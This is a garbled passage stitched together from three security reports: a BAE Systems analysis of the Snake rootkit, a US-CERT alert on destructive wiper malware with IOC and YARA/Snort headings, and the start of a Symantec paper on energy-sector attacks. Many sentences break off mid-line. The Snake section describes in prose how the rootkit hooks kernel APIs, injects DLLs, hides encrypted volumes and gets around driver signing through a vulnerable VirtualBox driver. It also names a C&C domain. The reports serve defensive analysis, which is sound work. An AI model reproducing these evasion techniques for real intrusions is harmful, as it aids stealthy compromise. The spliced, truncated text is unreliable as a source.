As long as the test tool named chrome.exe did not make any requests , its memory stayed pristine . There were no injections made
As soon as the tool made its first GET requests , the driver immediately injected a malicious DLL module in it , and that module
No .    Time            Source                Destination          Protocol Length Info
Received command
The domain names of the C&C servers it relies on are hard - coded in the body of the malware . Some examples are given below , and
As seen in the traffic dump above , the malware first resolves the domain name of its C&C.
Next , it fetches a file /D / pub.txt , and expects the server to respond with a string “ 1 ” , acknowledging it ’s active :
Once acknowledged , it asks the server for a command , and the server returns a new command to execute :
The command it receives from C&C above ( swim.onlinewebshop.net ) is encrypted . In order to decrypt it , the malware first
An identical XOR mask was also used by Agent . BTZ .
Next , it calculates and confirms a CRC32 checksum within the command , further decrypts the data by using the Number Theory
Library ( NTL ) , and makes sure the command is destined to the current host by matching the ID field in it .
Once decrypted , the malware interprets the received command , as reflected in the malware log below ( the new C&C server address
After that , the malware connects to the new C&C , asking it for another command :
The command it receives is called UpLoad , so it uploads all the collected logs to the server , and then cleans out those logs :
The files it uploads are stored inside its home directory % windows%\$NtUninstallQ[random]$ ,
For example , Snake ’s home directory could be C:\WINDOWS\$NtUninstallQ812589$.
The files within that directory are used by the rootkit to store configuration and log data .
When decrypted with the same XOR key that was used by Agent . BTZ , these files expose the following contents :
Temp : C:\WINDOWS\$NtUninstallQ812589$\SPUNINST\Temp
Analysis of the sample reveals that it supports 3 modes of fetching C&C commands .
Memory pipes is a common mechanism for Inter - Process Communications ( IPC ) . When the pipe server reads such requests from the
The diagram below demonstrates the last , ‘ pipe server’ mode of Snake operation :
Injected Snake DLL                System Process
Snake DLL                     Internet
Legitimate Process
Injected Snake DLL
User Mode
Kernel Mode
Legitimate Process
Embedded
Snake ’s Kernel Mode                                           DLL Module
Driver , with the DLL
The diagram illustrates the operation steps 1 - 4 :
As soon as the driver detects a usermode process that goes online ( e.g. a browser ) , it will inject malicious DLL module
In the ‘ pipe mode’ of operation , the injected DLL will start communicating with the pipe server by sending messages into
Once the task of communication with C&C is delegated to the pipe server , it will start communicating with the C&C ,
The reason behind the pipes usage is to ‘ legitimise’ the outbound web requests , forcing them to originate from the host firewall-
Pipe server is a special mode of the injected DLL . In order to switch into that mode , a dedicated thread is spawned to listen for IPC
Apart from GET / POST requests , the pipe clients ( infected usermode processes ) may also ask the pipe server to perform other
This delegation of tasks is designed to keep infected processes under the radar of the behavioural analysis tools for as long as
To delegate different types of tasks , the clients send messages to the pipe server using the following task identification headers :
The usermode component of Snake communicates with its kernel - mode driver via a device called \\.\vstor32 ( created under
To write data , it opens the device with CreateFile(“\\.\vstor32 ” ) , then calls DeviceIoControl ( ) API on its handle with
Configuration parameters along with the initial set of domain names are hard - coded within the body of the DLL . However , the data
Analysis of the commands performed by the malware suggests the following capabilities :
Together , these commands provide complete backdoor functionality , allowing remote attacker full control over the compromised
The ability to update the driver and then rely on its communication capabilities means that the components of Snake are flexible ,
For example , the virtual partitions are used by kernel - centric Snake variants , where the kernel - mode driver is responsible for the
This particular architecture relies on a kernel - mode driver to carry out the network communications . The usermode DLLs are still
The delivery mechanism is not known : it may be distributed via a thumb - drive , a phishing email attachment , or be delivered via an
Infection starts from a dropper penetrating into the compromised system where it is allowed to run . Once executed , the dropper
The analysed 32-bit dropper creates a driver in the following location :
However , different samples may use a different path and driver file name . For example , some samples exposed these filenames :
Once executed , the driver first makes sure it is registered under a pre - defined name , such as Ultra3 .
Other samples may have a different registration name , such as ~ROOT . The registration is ensured with creation of the following
Group = “ Streams Drivers ”
Start = 1 [ SYSTEM ]
Type = 1
The driver then flags the following events with the notification purposes :
The rootkit then places a number of the hooks .
The first API it hooks is IoCreateDevice ( ) . The installed hook handler calls the original API and then checks if the name of the
In order to hide its components , the driver hooks the following APIs :
For example , the hook handlers of the registry - related APIs will block access to the registry entries that contain the name of the
The ZwReadFile ( ) hook handler will block access to the home directory where the rootkit keeps its file . In one of the analysed
The ZwClose ( ) hook handler is used to inject the DLL module into the userland processes .
The hook handler for ZwTerminateProcess ( ) checks if the process being shut down is svchost.exe . If so , it considers
The ObOpenObjectByName ( ) hook is designed to hide the presence of its virtual partitions ( described later ) .
To encrypt data stored on its virtual partitions , the driver sets a hook for another API :
To re - infect the usermode process svchost.exe and to re - enable its network drivers , the rootkit hooks these APIs :
Snake then proceeds to the task of deep packet inspection and modification .
In order to accomplish it , it registers a callout driver for Windows Filtering Platform ( WFP ) , an architecture first introduced with
Windows Vista and nowadays normally used by antivirus and/or intrusion detection systems to inspect / block malicious traffic .
Snake sets filters at the layers FWPM_LAYER_STREAM_V4 and FWPM_LAYER_ALE_FLOW_ESTABLISHED_V4 in the TCP/
The driver inspects bidirectional network data on a per stream basis , as it ’s located right on the stream data path . An ability to
C&C servers :
In order to qualify as a browser , the usermode process must have any of the following names :
In addition to WFP , Snake also hooks the Transport Driver Interface ( TDI ) network routines by setting itself up as a TDI filter driver .
Being registered as a TDI driver on the device stack , Snake hooks TCP calls . This way it intercepts all requests along with their
By ‘ sniffing’ all the requests , it can now inspect the traffic , looking for and then parsing GET / POST HTTP requests and also SMTP
If the rootkit detects that the OS version is pre - Vista ( e.g. Windows XP ) or Windows Server 2008 ( e.g. Windows Server 2003 ) , it will
Whenever the client establishes connections , the TDI driver will also ‘ pulse’ the \BaseNamedObjects\wininet_activate
The data that the driver intercepts , along with the important notifications , is passed to the userland DLL to be processed . If the
For NDIS versions 5.X , Snake rootkit contains code that installs NDIS filter intermediate driver .
This driver is set up above a miniport driver ( a driver that communicates with the physical device ) and below a protocol driver ( a
The driver is registered with NdisIMRegisterLayeredMiniport ( ) API .
After that , the drivers hooks the following exports within ndis.sys :
The rootkit contains code that installs NDIS filter driver for NDIS 6.0 and above :
Unique name : { c06b1a3b-3d16 - 4181 - 8c8d-7015bfc5b972 }
User - readable description : filter_c06b1a3b
The driver is registered with NdisFRegisterFilterDriver ( ) API .
After that , the drivers hooks the following exports within ndis.sys ( for NDIS 6.0 ) :
Another set of exports it attempts to hook in ndis.sys ( for NDIS 6.0 ) is :
With the hooks installed , whenever the network adapter driver attempts to register to NDIS , or whenever there is an attempt to
With its own miniport handler functions , it can send / receive data by using a private TCP / IP stack , bypassing all firewall hooks , and
The Snake rootkit registers itself as Network Driver Interface Specification ( NDIS ) protocol driver .
Intercepting Network Data                                               Whenever the underlying miniport driver
Driver                                              Driver
Sending Network Data                                                    To send the data back , the protocol driver defines the data
Driver                                             Driver
Being able to fully manipulate traffic at 3 different levels ( NDIS protocol driver , TDI Driver , and WPF callout driver ) , Snake is able to
Infected User         Injected
Traffic Interception                                  Application         Module
Checks
Internet                                                                                         Memory
Traffic
Injection
Snake ’s Kernel Mode Driver
As the driver intercepts all connections ( e.g. on TDI_RECEIVE TDI event or ClientEventReceive ( ) event notification triggered
The authentication is implemented by decrypting the data and making sure it starts with the markers 0xDEADBEAF and
Here are specific steps :
By observing such behaviour , one might wonder why the driver is expecting HTTP or SMTP clients ? Why does it act like HTTP / SMTP
For example , in HTTP the driver will respond with messages like “ HTTP/1.1 200 OK ” or “ HTTP/1.1 500 Server Error ” .
For SMTP traffic , it communicates back normal SMTP server responses , such as “ 250 Sender OK ” , “ 503 Bad sequence of
The reason behind such behaviour is that the driver is acting in this mode like a proxy , routing requests from other infected hosts to
Another opportunity this mode unlocks is a peer - to - peer network mode with no centralised C&C. The infected hosts are capable
Once the incoming data is authenticated and decrypted , the driver passes it to the DLL by using memory pipes .
For example , on HTTP traffic arrival it may send traffic data into a memory pipe \Device\NamedPipe\isapi_http , and then ,
In order to log its activity , the driver writes log data into the pipe \Device\NamedPipe\isapi_log , so that the DLL could log the
Full list of the named pipes used for communications is provided below :
Messages submitted into the pipes are wrapped into the structures . The structures appear to contain headers to allow the pipe
For example , the message headers could be :
Once received from the pipes and unwrapped / decoded , the data is then handled by the usermode DLL as per the data intention -
The driver creates virtual file volumes for encrypted storage of its files and configuration data :
The volumes are mounted from the virtual file systems RawDisk1 and RawDisk2 .
The first partition is created with the following steps :
The hook installed by the rootkit on IofCallDriver ( ) API provides on - the - fly data encryption / decryption whenever that data is
As a result , whenever the data is saved into the volume Hd1 , it will be scrambled on - the - fly , and reflected in the persistent storage
Volume in drive Z has no label .
Volume Serial Number is 2479 - 98AC
Directory of Z:\WINDOWS\$NtuninstallQ817473 $
Analysis of the hotfix.dat file contents reveals it ’s a fully encrypted file with flat entropy . Thus , it is not possible to reveal the
Enlisting the contents of the created volume is possible , along with creating files on it :
Test
Volume in drive \\.\Hd1 has no label .
Volume Serial Number is BA9B-99E8
Directory of \\.\Hd1
However , as soon as IofCallDriver ( ) hook is removed , the same ‘ dir’ command will fail , as with no hook the rootkit can not
Incorrect function .
The second volume \\.\Hd2 is not mapped to a file , so when a computer is switched off , its contents is lost . Thus , it could be
Both volumes appear to be set up as FAT volumes .
An attempt to read the data from these volumes with the code below :
This will produce the following results :
For \\.\Hd1 :
For \\.\Hd2 :
The ability to keep its data on TrueCrypt - like volumes provides Snake with a powerful ability to exchange data with the usermode
Static analysis of the code reveals that the Snake driver uses virtual volumes to store its data and additional files on it .
For example , it stores its message queue in a file called :
The message queue indicates an asynchronous communication model between kernel mode driver and a usermode DLL ,
Other files that may also be found on the virtual volume are : klog , conlog , dump , rkng_inst.exe ,
The 64-bit version of Snake must deal with a number of additional security protections implemented in 64-bit editions of Microsoft
Windows , the most significant of which are kernel driver signature validation and Kernel Patch Protection ( more commonly known as
The driver signing policy enforced by all 64-bit versions of Windows from Vista onwards requires all kernel - mode drivers to be signed
On 64-bit versions of Windows Vista and above it behaves differently . Firstly , the 64-bit unsigned driver file is created as usual :
However , the driver is not registered ; what is registered instead is the dropper itself . To do that , the dropper first copies itself as :
The dropper then registers itself as a service to ensure it starts every time Windows is booted , by creating the values :
Type = 16
Start = 2
Now comes the most interesting part : does the dropper manage to load its 64-bit unsigned driver under 64-bit versions of Windows
Vista and later versions , such as 64-bit Windows 7/8 ? The answer : Yes , it does .
Does it resort to using bootkit technology , which has been used in the past to bypass protections to load unsigned 64-bit drivers ?
The answer : No . Bootkits must overwrite the Master Boot Record ( MBR ) and antivirus products are well trained to catch that kind of
The masterminds behind Snake rootkit seem to be well aware of this so what they resorted to instead is leveraging a vulnerability
In a nutshell , the VirtualBox software installs a driver called VBoxDrv . The driver is controlled with the Input / Ouput Control Codes
As per MSDN documentation7 , METHOD_NEITHER is a special transfer type when Input / Output Request Packet ( IRP ) supplies the
It is the responsibility of the driver to validate the addresses sent from user mode in order to make sure those addresses are valid
The source code of the vulnerable driver ( shown below ) demonstrates how the integer value of the rc variable is first derived from
Now that the vulnerable driver can be used as a weapon to patch kernel memory , all the malware needs to do is to patch the content
When running in WinPE mode there is no Code Integrity control , therefore by enabling this mode by patching only one bit ,
Code Integrity verification is disabled so that the unsigned 64-bit driver can be loaded .
This variable is used within the function SepInitializeCodeIntegrity ( ) , implemented within CI.dll ’s function
Once located , the content of the variable nt!g_CiEnabled is patched in kernel memory and the 64-bit unsigned driver is loaded .
This explains why Snake dropper registers itself as a service to start each time Windows starts : in order to install the vulnerable
In order to be able to perform the steps above , the dropper must first obtain Administrator privileges . It attempts to do this by
The usermode DLLs injected by the kernel - mode driver into the userland system process ( e.g. explorer.exe ) are :
The rkctl_Win32.dll / rkctl_x64.dll module uses the following hard - coded named pipe for communications :
The remote commands it receives appear to be designed to control other components of Snake :
The inj_snake_Win32.dll / inj_snake_x64.dll module exports 61 functions . It is designed to perform the high - level tasks
When the DLL activates , it reads configuration parameters from the configuration queue , that the driver creates on a virtual volume .
One of the parameters defines the pipe name(s ) that the DLL should use for its communications .
The remote commands received by this Snake DLL module are designed to set up various communication parameters :
To post the data , the DLL can use the following User - Agent string “ Mozilla/4.0 ( compatible ; MSIE 6.0 ) ” .
It may rely on the following Internet Media types ( MIME types ) for data exfiltration :
Request type it uses can either be POST of GET , and C&C server resource name is /default.asp .
One of the Snake components that could have been downloaded from a remote C&C server , was identified as a network
When run as a command line tool , with its logic defined with the command line switches , this tool enumerates other network hosts
The data it retrieves is encrypted and saved into a configuration file % system%\vtmon.bin . This file is then further encrypted with
By using this function the remote attacker can identify any potentially exploitable hosts located in the same network as the victim .
The attacker may then craft an exploit against those hosts , possibly by using the Metasploit framework , and then deliver the
If the tool successfully delivers the payload and exploits the remote host(s ) , it will replicate the infection across the network , taking
As seen from the check - in logs found within one of the recent samples , the time span covers almost 6 years from January 2007 till
December 2012 , which is aligned with the first reports of Agent . BTZ . It ’s worth noting that Agent . BTZ used the same XOR key for its
Log files created by the latest samples of Snake , compiled in 2013 and 2014 , were successfully decrypted with the same XOR key .
Other similarities include the usage of the virtual partition \\.\Vd1 , the temporary file named FA.tmp , usage of files named
The cyber - espionage operation behind the Snake rootkit is well established , a sample comiled in January 2006 indicates that
From a technical perspective , Snake demonstrates two very different approaches to the task of building a cyber - espionage toolkit .
One approach is to delegate the network communication engine to usermode code , backed up by a usermode rootkit . Another
The complexity of the usermode - centric approach is on par with Rustock rootkit - it uses similar techniques . It ’s an old well - polished
The presence of the reconnaissance tool in the Snake operators’ framework suggests the existence of an arsenal of infiltration
The analysed code suggests that even file system and registry operations can be delegated by an infected module to another
The logs and dumps it creates on the hidden virtual volumes contributes to its stealthiness too . A great deal of attention has also
We expect much more will be uncovered by researchers in the coming weeks as the capabilities of this operation are further fleshed
Domain                         IP Address        Country      Contact Email              Nameserver
Kernel - centric architecture
Usermode - centric architecture
Reconnaissance tool
Other analysed samples
Adaptec Windows Ultra3
Family Driver
Adaptec Windows Ultra3
Family Driver
Location       Type             Data
Memory         Event
Memory         Device
Memory         Antirootkit findings
File system    Volume
\\.\Hd1
\\.\Hd2
Registry       Key
File system    File
Memory         Named Pipe
Canditate SNORT rules :
E : 	 marketingai@baesystems.com
W : 	 www.baesysytems.com/ai
Level 6                               Surrey Research Park                   265 Franklin Street
Sydney NSW 2000                       Surrey , GU2 7RQ                        MA 02110
Australia                             United Kingdom                         USA
T : + 61 ( 0 ) 1300 027 001               T : + 44 ( 0 ) 1483 816000                 T : + 1 ( 617 ) 737 4170
Unit 2B-12 - 1                          Dubai Internet City
Jalan Stesen Sentral 5                Building 17
Kuala Lumpur Sentral                  Office Ground Floor 53
Kuala Lumpur , 50470                   PO Box 500523
T : + 603 2780 2052                     Dubai
T : + 971 4369 4369
Copyright © BAE Systems 2014 .
All rights reserved . BAE SYSTEMS , the BAE SYSTEMS Logo and the product names referenced herein are trademarks of BAE
Systems plc . BAE Systems Applied Intelligence Limited registered in England & Wales ( No.1337451 ) with its registered office at
Surrey Research Park , Guildford , England , GU2 7RQ . No part of this document may be copied , reproduced , adapted or redistributed
Alert ( TA14 - 353A )
Targeted Destructive Malware
Original release date : December 19 , 2014
Systems Affected
Microsoft Windows
Overview
Destructive Hard Drive Tool , and Destructive Target Cleaning Tool .
Listening Implant : During installation of this tool , a portion of the binaries is decrypted using AES , with a key derived from the phrase " National Football League . "
Additionally , this implant listens for connections on TCP port 195 ( for " sensvc.exe " and " msensvc.exe " ) and TCP port 444 ( for " netcfg.dll " ) . Each message sent to
Lightweight Backdoor : This is a backdoor listener that is designed as a service DLL . It includes functionality such as file transfer , system survey , process
Proxy Tool : Implants in this malware family are typically loaded via a dropper installed as a service , then configured to listen on TCP port 443 . The implant may
Destructive Hard Drive Tool : This tool is a tailored hard - drive wiping tool that is intended to destroy data past the point of recovery and to complicate the victim
Destructive Target Cleaning Tool : This tool renders victim machines inoperable by overwriting the Master Boot Record . The tool is dropped and installed by another
Network Propagation Wiper : The malware has the ability to propagate throughout the target network via built - in Windows shares . Based on the
Technical and strategic mitigation recommendations are included in the Solution section below .
Description
Cyber threat actors are using an SMB worm to conduct cyber exploitation activities . This tool contains five components – a listening implant , lightweight backdoor ,
The SMB worm propagates throughout an infected network via brute - force authentication attacks , and connects to a C2 infrastructure .
Impact
Due to the highly destructive functionality of this malware , an organization infected could experience operational impacts including loss of intellectual property and
Solution
Users and administrators are recommended to take the following preventive measures to protect their computer networks :
Use and maintain anti - virus software – Anti - virus software recognizes and protects your computer against most known viruses . It is important to keep your
Keep your operating system and application software up - to - date – Install software patches so that attackers ca n't take advantage of known problems or
Review Security Tip Handling Destructive Malware # ST13 - 003 and evaluate their capabilities encompassing planning , preparation , detection , and response
Review Recommended Practices for Control Systems , and Improving Industrial Control Systems Cybersecurity with Defense - in - Depth Strategies ( pdf ) .
The following is a list of the Indicators of Compromise ( IOCs ) that can be added to network security solutions to determine whether they are present on a network .
Characterization : File Hash Watchlist
Notes : " SMB worm tool "
Earliest PE compile Time : 20141001T072107Z
Most Recent PE compile Time : 20141001T072107Z
Characterization : File Hash Watchlist
Notes : " SMB worm tool "
Earliest PE compile Time : 20141001T120954Z
Most Recent PE compile Time : 20141001T142138Z
Lightweight backdoor :
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20110411T225224Z
Latest PE compile time : 20110411T225224Z
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20110517T050015Z
Latest PE compile time : 20110605T204508Z
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20110729T062417Z
Latest PE compile time : 20110729T062958Z
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20120128T071327Z
Latest PE compile time : 20120128T071327Z
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20120309T105837Z
Latest PE compile time : 20120309T105837Z
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20120311T090329Z
Latest PE compile time : 20120311T090329Z
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20120325T053138Z
Latest PE compile time : 20130513T090422Z
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20130802T054822Z
Latest PE compile time : 20130802T054822Z
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20130913T013016Z
Latest PE compile time : 20130913T013016Z
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20140205T090906Z
Latest PE compile time : 20140205T090906Z
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20140320T152637Z
Latest PE compile time : 20140402T023748Z
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20140321T014949Z
Latest PE compile time : 20140321T014949Z
Characterization : File Hash Watchlist
Notes : " Lightweight backdoor "
Earliest PE compile time : 20140506T020330Z
Latest PE compile time : 20140506T020330Z
Proxy tool :
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140611T064905Z
Latest PE compile time : 20140611T064905Z
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140617T035143Z
Latest PE compile time : 20140617T035143Z
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140618T064527Z
Latest PE compile time : 20140618T064527Z
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140724T011233Z
Latest PE compile time : 20140724T011233Z
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140724T065031Z
Latest PE compile time : 20140902T135050Z
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140819T024812Z
Latest PE compile time : 20140819T024812Z
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140902T172442Z
Latest PE compile time : 20140902T172442Z
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20141024T134136Z
Latest PE compile time : 20141024T134136Z
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140526T010925Z
Latest PE compile time : 20140526T010925Z
Characterization : File Hash Watchlist
Notes : " Proxy tool "
Earliest PE compile time : 20140611T064904Z
Destructive hard drive tool :
Characterization : File Hash Watchlist
Notes : " Destructive hard drive tool "
Earliest PE compile time : 20120507T151820Z
Latest PE compile time : 20120507T151820Z
Characterization : File Hash Watchlist
Notes : " Destructive target cleaning tool "
Earliest PE compile time : 20130318T003315Z
Latest PE compile time : 20130318T003315Z
Characterization : File Hash Watchlist
Notes : " Destructive target cleaning tool "
Earliest PE compile time : 20130318T003319Z
Latest PE compile time : 20130318T003319Z
Name : d1c27ee7ce18675974edf42d4eea25c6.bin
Size : 268579 bytes ( 268.6 KB )
The malware has the following characteristics :
While the original filename of this file is unknown , it was likely “ diskpartmg16.exe ” . This file serves as a dropper . It drops destructive malware : “ igfxtrayex.exe ” .
When the dropper file was executed , it started a second instance of itself with “ -i ” as an argument , and then terminated . The second instance of the dropper file
Name : net_ver.dat
Size : 4572 bytes ( 4.6 KB ) ( size will vary )
This is a log file created by the dropper , and appended to as the scans progress It contains what appear to be hostnames , IP addresses , and the number 2 .
Entries in the file have the structure “ HOSTNAME | IP Address | 2 ” .
Name : igfxtrayex.exe
Size : 249856 bytes ( 249.9 KB )
This file is destructive malware : a disk wiper with network beacon capabilities . If “ igfxtrayex.exe ” is run with no parameters , it creates and starts a copy of itself with
Name : iissvr.exe
Size : 114688 bytes ( 114.7 KB )
This file , when executed , starts a listener on localhost port 80 . It has 3 files contained in the resource section ; all xor’d with 0x63 .
Name : usbdrv3_32bit.sys
Size : 24280 bytes ( 24.3 KB )
This SYS file is a commercially available tool that allows read / write access to files and raw disk sectors for user mode applications in Windows 2000 , XP , 2003 ,
Vista , 2008 ( 32-bit ) . It is dropped from resource ID 0x81 of “ igfxtrayex.exe ” .
Name : usbdrv3_64bit.sys
Size : 28120 bytes ( 28.1 KB )
This SYS file is a also a commercially available tool that allows read / write access to files and raw disk sectors for user mode applications in Windows 2000 , XP ,
Name : igfxtpers.exe
Size : 91888 bytes ( 91.9 KB )
A summary of the C2 IP addresses :
Snort signatures :
Listening Implant :
Lightweight Backdoor :
Proxy Tool :
Malware associated with the cyber threat actor :
Host Based Indicators
Below are potential YARA signatures to detect malware binaries on host machines :
Lightweight Backdoor :
Lightweight Backdoor :
Lightweight Backdoor :
Lightweight Backdoor :
Lightweight Backdoor :
Lightweight Backdoor :
Proxy Tool :
Proxy Tool :
Proxy Tool :
Destructive Hard Drive Tool :
F3 A5 8B 7C 24 30 85 FF 7E 3A 8B 74 24 2C 8A 44 24 08 53 8A 4C 24 21 8A 5C 24 2B 32 C1 8A 0C 32 32 C3 32 C8 88 0C 32 B9 1E 00 00 00 8A 5C 0C 0C 88
Destructive Target Cleaning Tool :
Destructive Target Cleaning Tool :
Destructive Target Cleaning Tool :
Destructive Target Cleaning Tool :
Destructive Target Cleaning Tool :
Destructive Target Cleaning Tool :
Destructive Target Cleaning Tool :
Destructive Target Cleaning Tool :
Malware used by cyber threat actor :
Malware used by cyber threat actor :
Malware used by cyber threat actor :
Recommended Security Practices
Because of the highly destructive functionality of the malware , an organization infected with the malware could experience operational impacts including loss of
Tactical Mitigations
Implement the indicators of compromise within your systems for detection and mitigation purposes .
Encourage users to transfer critical files to network shares , to allow for central backed up .
Execute daily backups of all critical systems .
Periodically execute an “ offline ” backup of critical files to removable media .
Establish emergency communications plans should network resources become unavailable .
Isolate any critical networks ( including operations networks ) from business systems .
Identify critical systems and evaluate the need for having on - hand spares to quickly restore service .
Ensure antivirus is up to date .
Disable credential caching for all desktop devices with particular importance on critical systems such as servers and restrict the number of cached credential
Disable AutoRun and Autoplay for any removable media device .
Prevent or limit the use of all removable media devices on systems to limit the spread or introduction of malicious software and possible exfiltration data ,
Consider restricting account privileges . It is our recommendation that all daily operations should be executed using standard user accounts unless
Ensure that password policy rules are enforced and Admin password values are changed periodically .
Consider prohibiting hosts within the production environment or DMZ from sharing an Active Directory enterprise with hosts on other networks . Each
Consider deployment of a coaching page with click through acceptance ; these are traditionally deployed in an environment to log the acceptance of network
Monitor logs -- Maintain and actively monitor a centralized logging solution that keeps track of all anomalous and potentially malicious activity .
Ensure that all network operating systems , web browsers , and other related network hardware and software remain updated with all current patches and
Strategic Mitigations
Organizations should review Security Tip Handling Destructive Malware # ST13 - 003 and evaluate their capabilities encompassing planning , preparation ,
Always keep your patch levels up to date , especially on computers that host public services accessible through the firewall , such as HTTP , FTP , mail , and
Build host systems , especially critical systems such as servers , with only essential applications and components required to perform the intended function .
Any unused applications or functions should be removed or disabled , if possible , to limit the attack surface of the host .
Implement network segmentation through V - LANs to limit the spread of malware .
Consider the deployment of Software Restriction Policy set to only allow the execution of approved software ( application whitelisting )
Recommend the whitelisting of legitimate executable directories to prevent the execution of potentially malicious binaries .
Consider the use of two - factor authentication methods for accessing privileged root level accounts or systems .
Consider deploying a two - factor authentication through a hardened IPsec / VPN gateway with split - tunneling prohibited for secure remote access .
Deny direct Internet access , except through the use of proxies for Enterprise servers and workstations . Perform regular content filtering at the proxies or
Implement a Secure Socket Layer ( SSL ) inspection capability to inspect both ingress and egress encrypted network traffic for potential malicious activity .
Isolate network services , such as email and Web application servers by utilizing a secure multi - tenant virtualization technology . This will limit the damage
Implement best practice guidance and policy to restrict the use of non - Foundation assets for processing or accessing Foundation - controlled data or systems
Minimize network exposure for all control system devices . Control system devices should not directly face the Internet .
Place control system networks behind firewalls , and isolate or air gap them from the business network .
When remote access is required , use secure methods , such as Virtual Private Networks ( VPNs ) , recognizing that VPN is only as secure as the connected
Industrial Control System ( ICS)-CERT and US - CERT remind organizations to perform proper impact analysis and risk assessment prior to taking defensive
References
N / A
Revisions
December 19 , 2014 : Initial Release
This product is provided subject to this Notification and this Privacy & Use policy .
Targeted Attacks Against
Candid Wueest
Version 1.0 – January 13 , 2014 , 14:00 GMT
The energy sector has become a major focus for targeted
Follow us on Twitter                     Visit our Blog
Introduction ................................................................... 5
Exposed systems : Online and offline ............................. 7
Smart grid : A new potential avenue of attack 	 �������������� 8
History of discovered attacks ...................................... 10
Stuxnet ................................................................... 11
Night Dragon .......................................................... 11
Shamoon / Disttrack ................................................ 12
Spear phishing attacks in the energy sector 	 �������������� 14
New Year ’s campaign ............................................. 14
Greek oil campaign ................................................. 14
Motivation and origin ................................................... 16
Protection and mitigation ............................................ 16
Conclusion .................................................................... 19
Appendix ...................................................................... 21
A. Spear phishing .................................................. 21
B. Visualization with TRIAGE .................................. 24
C. Phases of targeted attacks ................................ 25
Resources ..................................................................... 28
The energy sector has become a major focus for targeted attacks and is now among the top
The threat to energy firms comes from several different sources . In some cases , espionage
During the monitoring period from July 2012 to June 2013 , we observed an average of 74
Accounting for 16.3 percent of all attacks , the energy sector was the second most targeted
Not all of the attacks analyzed used highly sophisticated tools . Most of them could have
Many power
Targeted Attacks Against the Energy Sector
Introduction
The number of targeted cyberattacks in general has risen in the past few years . In addition to this , the rate of
Foreign Relations , a US think tank , reported that energy companies , including oil and gas producers , were often
Cyber Emergency Response Team ( ICS - CERT ) . A report by the US Congress supported this picture , stating that
As in most sectors , attackers are often after valuable information . For example , we have seen attackers target
In the past there have been quite a few attacks that included targets in the energy sector . Some of these were
One of the biggest examples , and a game changer for many organizations , was Stuxnet . This targeted sabotage
It is also clear that the energy sector is not exempt from the generic attacks that every company faces , such
For this paper we focused on email data from targeted attacks between July 2012 and June 2013 . Even though
Poison Ivy , being used by generic attackers and by targeted attacks . In such cases the sole difference between a
Page 5
Experts predict
Targeted Attacks Against the Energy Sector
Exposed systems : Online and offline
Historically most industrial control systems ( ICS ) and supervisory control and data acquisition ( SCADA ) systems
If networks are truly segregated , this would mean that there would be no software updates installed , leaving
With the increasing desire for connectivity now reaching industrial plants , many operators have started to
Depending on the type of machinery controlled through the human - machine interface ( HMI ) of the ICS , not all
And even if they are fully connected , some turbines have physical limitations or emergency systems based on
An additional source of concern is that some countries have started to open the energy market for smaller
To increase the exposure of energy firms even further , sites like SHODAN , which is essentially a search engine
Page 7
Targeted Attacks Against the Energy Sector
Smart grid : A new potential avenue of attack
Smart grids and smart metering are
Experts predict that
As with any connected infrastructure , it is important to
In addition to the issue of securing these devices , smart grids will produce a huge amount of data which ,
It is beyond the scope of this paper to address all the challenges associated with smart grids and smart meters .
Symantec has created a dedicated whitepaper for this topic : How to protect critical infrastructure , mitigate fraud
Page 8
There have
Targeted Attacks Against the Energy Sector
History of discovered attacks
There have been numerous cyberattacks against the energy sector over the past few years . Not all of them were
In 2013 part of the Austrian and German power grid nearly broke down after a control command was
German gas company as a test for their newly installed network branch , found its way into the systems of the
Austrian energy power control and monitoring network . Once there , the message generated thousands of reply
Fortunately the situation was resolved without any power outages .
In 2008 , Tom Donahue , a senior Central Intelligence Agency ( CIA ) official told a meeting of utility company
In some cases the attacker tried to extort money from the energy companies , threatening them with further
In 2003 the safety monitoring system of the Ohio nuclear power plant apparently went offline for several hours
At the beginning of 2003 a marine terminal in Venezuela was targeted by a sabotage attack . Details of this attack
In 2001 an attack took place against California ’s power distribution center , which controls the flow of electricity
United States .
According to Russian officials , the largest natural gas extraction company in the country was successfully
Page 10
Targeted Attacks Against the Energy Sector
Aside from these incidents , there have also been a number of more serious and well - documented targeted
Stuxnet
The Stuxnet incident and its relatives Duqu , Flamer and Gauss are some of the most talked - about cases of
Stuxnet is a sophisticated piece of malware , which uses seven vulnerabilities to spread and infect its targets .
The most notable vulnerability is the Microsoft Windows Shortcut ‘ LNK / PIF’ Files Automatic File Execution
Vulnerability ( CVE-2010 - 2568 ) , which allows it to auto - execute on USB drives . Spreading through infected
Internet . This was most likely the first infection vector used by Stuxnet . In addition , it is able to infect Step7
Chevron were infected by Stuxnet , without any damage being done .
Part of the malware code was signed with stolen digital certificates making it harder to detect by security tools .
To hide its activity even further , Stuxnet executed slightly different infection routines depending on the security
Stuxnet ’s payload focused on PLCs , which are used to control different industrial components . The target of the
Stuxnet operation is believed to be a uranium enrichment facility in Iran . The sabotage payload disrupted and
